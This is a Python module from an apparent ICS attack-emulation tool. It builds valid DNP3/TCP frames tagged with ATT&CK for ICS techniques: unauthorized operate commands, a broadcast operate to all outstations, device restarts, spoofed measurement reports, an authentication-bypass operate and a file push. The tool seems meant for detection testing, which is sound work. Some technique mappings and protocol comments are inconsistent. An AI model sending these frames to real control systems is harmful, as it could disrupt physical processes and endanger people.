# ICSForge DNP3 payload builder — upgraded for ATT&CK for ICS realism
# Implements real DNP3/TCP link+transport+application layer framing
# CRC-16/DNP computed per IEEE 1815 / IEC 62351-5
import random
import struct

from .common import marker_bytes

# ── DNP3 CRC-16 lookup table (polynomial 0x3D65, bit-reversed) ───────
# Ref: IEEE 1815-2012 Annex E, identical to IEC 62351-5
_CRC_TABLE = [0] * 256

def _build_crc_table():
    poly = 0xA6BC  # reversed 0x3D65
    for i in range(256):
        crc = i
        for _ in range(8):
            if crc & 1:
                crc = (crc >> 1) ^ poly
            else:
                crc >>= 1
        _CRC_TABLE[i] = crc & 0xFFFF

_build_crc_table()


def dnp3_crc(data: bytes) -> int:
    """Compute DNP3 CRC-16 over *data* (returns 16-bit int, little-endian on wire)."""
    crc = 0x0000
    for b in data:
        crc = (_CRC_TABLE[(crc ^ b) & 0xFF] ^ (crc >> 8)) & 0xFFFF
    return (~crc) & 0xFFFF

# Application Function Codes (IEC 60870-5 / IEEE 1815)
FC = {
    "confirm":             0x00,
    "read":                0x01,
    "write":               0x02,
    "select":              0x03,
    "operate":             0x04,
    "direct_operate":      0x05,
    "direct_operate_nr":   0x06,  # no-ack
    "cold_restart":        0x0D,
    "warm_restart":        0x0E,
    "enable_unsolicited":  0x14,
    "disable_unsolicited": 0x15,
    "assign_class":        0x16,
    "delay_measure":       0x17,
    "open_file":           0x19,
    "authenticate_req":    0x20,
    "response":            0x81,
    "unsolicited":         0x82,
}

# Group/Variation for objects (Group, Variation)
OBJ = {
    "binary_input":     (1,  2),   # Binary Input with flags
    "binary_output":    (10, 2),   # Binary Output with flags
    "analog_input":     (30, 1),   # 32-bit with flags
    "analog_output":    (40, 1),   # 32-bit with flags
    "counter":          (20, 1),   # 32-bit counter
    "class0":           (60, 1),   # Class 0 data
    "class1":           (60, 2),   # Class 1 data
    "class2":           (60, 3),   # Class 2 data
    "class3":           (60, 4),   # Class 3 data
    "time":             (50, 1),   # Time and date
    "iin":              (80, 1),   # Internal Indications
}



def _data_blocks(payload: bytes) -> bytes:
    """Split payload into 16-byte blocks each followed by a 2-byte CRC.

    Per IEEE 1815-2012 §8.2: the data portion of a DNP3 frame consists of
    one or more user data blocks. Each block is up to 16 bytes of data
    followed by a 2-byte CRC computed over that block. The link layer
    Length field counts 5 (fixed header fields) + all data-block bytes
    (i.e. including the per-block CRC bytes, but excluding the start
    octets 0x05 0x64 and the header CRC).
    """
    blocks = b""
    i = 0
    while i < len(payload):
        block = payload[i : i + 16]
        blocks += block + struct.pack("<H", dnp3_crc(block))
        i += 16
    return blocks

def _link_header(dest: int, src: int, payload_len: int) -> bytes:
    """DNP3 link layer header (10 bytes) with valid CRC-16.

    Format: 0x0564 | length | ctrl | dest(LE) | src(LE) | CRC(LE)
    The CRC covers bytes 0-7 (start, length, ctrl, dest, src).
    data_block_len: total length of data blocks INCLUDING per-block CRC bytes.
    Length field = 5 + data_block_len (per IEEE 1815-2012 §8.2).
    """
    ctrl = 0xC4  # PRM=1, FCB=0, FCV=0, FC=4 (USER_DATA_NO_ACK)
    length = 5 + payload_len
    length = max(5, min(255, length))
    hdr_body = struct.pack("<BBBBHH", 0x05, 0x64, length, ctrl, dest & 0xFFFF, src & 0xFFFF)
    crc = dnp3_crc(hdr_body)
    return hdr_body + struct.pack("<H", crc)


def _app_layer(fc_byte: int, obj_group: int = 60, obj_var: int = 1,
               count: int = 0, extra: bytes = b"", seq: int | None = None) -> bytes:
    """Build transport+application layer bytes.

    seq: application-layer sequence number (0-15). If None, a random value
         is used so successive packets in a scenario look like a real session.
    """
    import random as _r
    _seq = (seq if seq is not None else _r.randint(0, 15)) & 0x0F
    transport = bytes([0xC0 | _seq])  # FIR=1 FIN=1 SEQ=random
    app_ctrl  = bytes([0xC0 | _seq])  # FIR=1 FIN=1 CON=0 UNS=0 SEQ=random
    func      = bytes([fc_byte])
    if count > 0 and obj_group:
        # Select qualifier per IEEE 1815:
        # Qualifier 0x06 = no range (all objects, used for Class 0/1/2/3 reads)
        # Qualifier 0x07 = count (8-bit), used for point-specific reads
        # Qualifier 0x28 = count (16-bit), used for large point sets
        if obj_group == 60:
            # Class data objects: use qualifier 0x06 (all objects, no range)
            obj_hdr = struct.pack("BBB", obj_group & 0xFF, obj_var & 0xFF, 0x06)
        elif count <= 255:
            # Point objects: use qualifier 0x07 (8-bit count)
            obj_hdr = struct.pack("BBB", obj_group & 0xFF, obj_var & 0xFF, 0x07) + bytes([count])
        else:
            # Large count: use qualifier 0x28 (16-bit count)
            obj_hdr = struct.pack("BBBH", obj_group & 0xFF, obj_var & 0xFF, 0x28, min(count, 0xFFFF))
        app_body = app_ctrl + func + obj_hdr + extra
    else:
        app_body = app_ctrl + func + extra
    return transport + app_body


def build_payload(marker: str, style: str = "read", **kwargs) -> bytes:
    """
    Build DNP3/TCP frame.

    Styles:
      read                 FC01 class0 — T0801 Monitor Process State
      read_class1          FC01 class1 — T0802 Automated Collection
      write                FC02 — T0855 Unauthorized Command
      select               FC03 — T0855 pre-operate (select phase)
      operate              FC04 — T0855 Unauthorized Command (operate phase)
      direct_operate       FC05 — T0855/T0831 without select
      direct_operate_nr    FC06 — T0855 no-ack (evasion variant)
      cold_restart         FC0D — T0816 Device Restart
      warm_restart         FC0E — T0816 Device Restart (warm)
      enable_unsolicited   FC14 — T0849/T0856 Spoof Reporting
      disable_unsolicited  FC15 — T0815 Denial of View
      assign_class         FC16 — T0841 reconfiguration sweep
      delay_measure        FC17 — T0841 timing/network probe
      read_analog          FC01 analog — T0801 process monitoring
      read_counter         FC01 counters — T0882 Theft of Operational Info
      authenticate_req     FC20 — T0858 Change Credential
    """
    rnd  = random.Random(kwargs.get("seed"))
    dest = int(kwargs.get("dnp3_dest", rnd.randint(1, 10)))   & 0xFFFF
    src  = int(kwargs.get("dnp3_src",  rnd.randint(1024, 65000))) & 0xFFFF
    mb   = marker_bytes(marker)
    # Monotonic app-layer sequence from engine; None → random per packet
    _dnp3_seq: int | None = (int(kwargs.get("dnp3_seq")) & 0x0F) if kwargs.get("dnp3_seq") is not None else None

    if style == "read":
        # Read all class 0 data
        app = _app_layer(FC["read"], obj_group=60, obj_var=1, count=1, extra=mb, seq=_dnp3_seq)

    elif style == "read_class1":
        app = _app_layer(FC["read"], obj_group=60, obj_var=2, count=1, extra=mb, seq=_dnp3_seq)

    elif style == "read_analog":
        app = _app_layer(FC["read"], obj_group=30, obj_var=1, count=rnd.randint(1,8), extra=mb)

    elif style == "read_counter":
        app = _app_layer(FC["read"], obj_group=20, obj_var=1, count=rnd.randint(1,4), extra=mb)

    elif style == "write":
        app = _app_layer(FC["write"], obj_group=10, obj_var=2, count=rnd.randint(1,4), extra=mb)

    elif style == "select":
        # Select before operate: Group 12 Var 1 (CROB)
        crob = bytes([0x03, 0x01]) + struct.pack('<II', 200, 0)  # PULSE_ON, count=1, on=200ms, off=0ms
        app  = _app_layer(FC["select"], obj_group=12, obj_var=1, count=1, extra=crob + mb, seq=_dnp3_seq)

    elif style == "operate":
        crob = bytes([0x03, 0x01, 0x00, 0x00, 0xC8, 0x00, 0x00, 0x00])
        app  = _app_layer(FC["operate"], obj_group=12, obj_var=1, count=1, extra=crob + mb, seq=_dnp3_seq)

    elif style == "direct_operate":
        crob = bytes([0x41, 0x01]) + struct.pack('<II', 200, 0)  # LATCH_ON, count=1, on=200ms
        app  = _app_layer(FC["direct_operate"], obj_group=12, obj_var=1, count=1, extra=crob + mb, seq=_dnp3_seq)

    elif style == "direct_operate_nr":
        crob = bytes([0x41, 0x01, 0x00, 0x00, 0xC8, 0x00, 0x00, 0x00])
        app  = _app_layer(FC["direct_operate_nr"], obj_group=12, obj_var=1, count=1, extra=crob + mb, seq=_dnp3_seq)

    elif style == "cold_restart":
        app = _app_layer(FC["cold_restart"], extra=mb, seq=_dnp3_seq)

    elif style == "warm_restart":
        app = _app_layer(FC["warm_restart"], extra=mb, seq=_dnp3_seq)

    elif style == "enable_unsolicited":
        app = _app_layer(FC["enable_unsolicited"], obj_group=60, obj_var=2, count=1, extra=mb, seq=_dnp3_seq)

    elif style == "disable_unsolicited":
        app = _app_layer(FC["disable_unsolicited"], obj_group=60, obj_var=2, count=1, extra=mb, seq=_dnp3_seq)

    elif style == "assign_class":
        app = _app_layer(FC["assign_class"], obj_group=1, obj_var=0, count=0, extra=mb, seq=_dnp3_seq)

    elif style == "delay_measure":
        app = _app_layer(FC["delay_measure"], extra=mb, seq=_dnp3_seq)

    elif style == "authenticate_req":
        # Auth challenge object (Group 120 Var 1)
        challenge = struct.pack(">HHH", rnd.randint(0, 0xFFFF), 0x0003, 0x0001) + b"\x00" * 4
        app = _app_layer(FC["authenticate_req"], obj_group=120, obj_var=1, count=1, extra=challenge + mb, seq=_dnp3_seq)

    elif style == "clear_events":
        # FC02 Write to event log object to clear — T0872 Indicator Removal on Host
        # Write to class 0 data (G60V1) with count=0 to reset event buffer
        app = _app_layer(FC["write"], obj_group=60, obj_var=1, count=0, extra=mb, seq=_dnp3_seq)

    elif style == "broadcast_operate":
        # Direct operate to broadcast address — T0855/T0803 Block Command / Unauthorized Command
        # DNP3 broadcast (dest=0xFFFF) operates all outstation outputs simultaneously
        dest = 0xFFFF  # override destination to broadcast
        app  = _app_layer(FC["direct_operate"], obj_group=10, obj_var=2, count=1, extra=mb, seq=_dnp3_seq)
        blocks = _data_blocks(app)
        lhdr = _link_header(dest, src, len(blocks))
        return lhdr + blocks

    elif style == "file_open":
        # FC open_file — T0807 Command-Line Interface (file operations on outstation)
        # DNP3 file transfer service can be used to push scripts to outstation filesystem
        filename = b"payload.sh\x00"
        app = _app_layer(FC["open_file"], extra=filename + mb, seq=_dnp3_seq)

    elif style == "warm_restart2":
        # FC warm_restart — T0858 Change Operating Mode (restart into alternate mode)
        app = _app_layer(FC["warm_restart"], extra=mb, seq=_dnp3_seq)

    elif style == "spoof_response":
        # DNP3 unsolicited response with injected data — T0856 Spoof Reporting Message
        # Attacker sends unsolicited response with false measurement values
        app = _app_layer(FC["unsolicited"], obj_group=30, obj_var=1, count=1,
                         extra=struct.pack("<i", kwargs.get("value", rnd.randint(5000, 9999))) + mb)

    elif style == "default_auth_bypass":
        # FC direct_operate without authentication — T0812 Default Credentials
        # DNP3 SAv5 bypass: operate without completing challenge-response
        app = _app_layer(FC["direct_operate"], obj_group=10, obj_var=2, count=1, extra=mb, seq=_dnp3_seq)

    else:
        app = _app_layer(FC["read"], obj_group=60, obj_var=1, count=1, extra=mb, seq=_dnp3_seq)

    blocks = _data_blocks(app)
    lhdr = _link_header(dest, src, len(blocks))
    return lhdr + blocks
